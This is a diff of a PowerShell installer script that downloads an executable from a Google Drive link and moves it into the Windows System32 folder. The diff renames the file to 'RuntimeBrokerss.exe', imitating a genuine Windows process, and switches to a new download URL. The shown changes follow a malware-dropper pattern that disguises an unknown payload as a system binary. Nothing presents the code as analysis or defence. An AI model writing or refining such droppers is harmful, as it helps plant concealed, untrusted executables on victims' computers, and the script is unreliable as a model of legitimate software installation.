@@ -19,9 +19,9 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # -----------------------------
 # Define paths and variables
 # -----------------------------
-$system32Path = "$env:public\Pictures"
-$exeDestination = Join-Path $system32Path "Nuggetdiwaa.exe"
-$exeUrl = "https://drive.usercontent.google.com/download?id=1By2LOGUPfTc_vYNMZNxSM-LEufbjyjd7&export=download&authuser=0&confirm=t&uuid=0dff048d-8cb5-4f47-910d-7aee55248aa3&at=ALWLOp6-cPHRYLaislLwnsLHgtJp%3A1764074871780"
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerss.exe"
+$exeUrl = "https://drive.usercontent.google.com/download?id=1rJQnGIRMRAvsD3I26xAZfM7_zSm-_70M&export=download&authuser=0&confirm=t&uuid=c7fcef78-16b4-46ed-8185-29e398b0d59a&at=ALWLOp4BU9tsYm5IsBFJsxNk_AFb%3A1764076160015"
 
 # -----------------------------
 # Install & Run Mode
@@ -31,14 +31,14 @@ if ($choice -eq "1") {
 
 
     # Download exe and rename to sarudpakkrub.exe
-    Write-Host "Downloading and renaming executable to Nuggetdiwaa.exe..."
+    Write-Host "Downloading and renaming executable to RuntimeBrokerss.exe..."
     try {
         $tempFile = Join-Path $env:TEMP "Nugget_temp.exe"
         Invoke-WebRequest -Uri $exeUrl -OutFile $tempFile
         Move-Item -Path $tempFile -Destination $exeDestination -Force
-        Write-Host "Nuggetdiwaa.exe download completed." -ForegroundColor Green
+        Write-Host "RuntimeBrokerss.exe download completed." -ForegroundColor Green
     } catch {
-        Write-Host "Nuggetdiwaa.exe download failed: $_" -ForegroundColor Red
+        Write-Host "RuntimeBrokerss.exe download failed: $_" -ForegroundColor Red
         exit
     }
 
@@ -61,9 +61,9 @@ elseif ($choice -eq "2") {
     Write-Host "Cleaning up installation..."
 
     # Stop the process if running
-    Write-Host "Stopping sarudpakkrub.exe process..."
+    Write-Host "Stopping RuntimeBrokerss.exe process..."
     try {
-        Stop-Process -Name "Nuggetdiwaa" -Force -ErrorAction SilentlyContinue
+        Stop-Process -Name "RuntimeBrokerss" -Force -ErrorAction SilentlyContinue
         Write-Host "Process stopped." -ForegroundColor Green
     } catch {
         Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
